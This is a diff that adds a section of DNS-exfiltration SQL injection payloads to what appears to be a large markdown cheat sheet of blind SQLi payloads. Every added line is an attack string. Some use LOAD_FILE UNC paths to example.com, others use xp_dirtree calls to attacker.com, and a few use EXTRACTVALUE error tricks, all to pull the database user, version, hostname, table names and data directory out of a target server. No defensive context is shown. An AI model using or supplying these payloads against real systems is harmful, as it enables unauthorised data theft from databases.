@@ -491,5 +491,32 @@ Here are **200+ Boolean-Based Blind SQLi Payloads** categorized by database type
 - `SELECT%2520%0A1,2,3--`
 - `SELECT%60%0A1,2,3--`
 
+---
+
+## 📋 DNS Exfiltration SQLi Techniques
+
+### Common DNS Exfiltration Payloads
+- `' UNION SELECT LOAD_FILE(CONCAT('\\',(SELECT user()),'.example.com\'))--`
+- `' UNION SELECT NULL, NULL, LOAD_FILE(CONCAT('\\',(SELECT DATABASE()),'.example.com\'))--`
+- `' UNION SELECT 1,2,LOAD_FILE(CONCAT('\\',(SELECT @@version),'.example.com\'))--`
+- `' UNION SELECT 1,2,LOAD_FILE(CONCAT('\\',(SELECT table_name FROM information_schema.tables LIMIT 1),'.example.com\'))--`
+- `' UNION SELECT NULL,EXTRACTVALUE(rand(),CONCAT(0x3a,(SELECT user())))--`
+- `' UNION SELECT NULL,EXTRACTVALUE(rand(),CONCAT(0x3a,(SELECT DATABASE())))--`
+- `' UNION SELECT NULL,EXTRACTVALUE(rand(),CONCAT(0x3a,(SELECT table_name FROM information_schema.tables LIMIT 1)))--`
+- `' UNION SELECT NULL,LOAD_FILE(CONCAT('\\',(SELECT @@hostname),'.example.com\'))--`
+- `' UNION SELECT NULL,EXTRACTVALUE(rand(),CONCAT(0x3a,(SELECT @@global.version)))--`
+- `' UNION SELECT NULL,EXTRACTVALUE(rand(),CONCAT(0x3a,(SELECT @@hostname)))--`
+
+### Advanced DNS Exfiltration Techniques
+- `1;EXEC xp_dirtree('//attacker.com/'+(SELECT user()))--`
+- `1;EXEC xp_dirtree('//attacker.com/'+(SELECT DATABASE()))--`
+- `1;EXEC xp_dirtree('//attacker.com/'+(SELECT @@hostname))--`
+- `1;EXEC xp_dirtree('//attacker.com/'+(SELECT table_name FROM information_schema.tables LIMIT 1))--`
+- `1;EXEC master.dbo.xp_dirtree '//attacker.com/'+(SELECT user())--`
+- `1;EXEC master.dbo.xp_dirtree '//attacker.com/'+(SELECT DATABASE())--`
+- `1;EXEC master.dbo.xp_dirtree '//attacker.com/'+(SELECT @@hostname)--`
+- `1;EXEC master.dbo.xp_dirtree '//attacker.com/'+(SELECT @@version)--`
+- `1;EXEC master.dbo.xp_dirtree '//attacker.com/'+(SELECT table_name FROM information_schema.tables LIMIT 1)--`
+- `1;EXEC master.dbo.xp_dirtree '//attacker.com/'+(SELECT @@datadir)--`
 
 
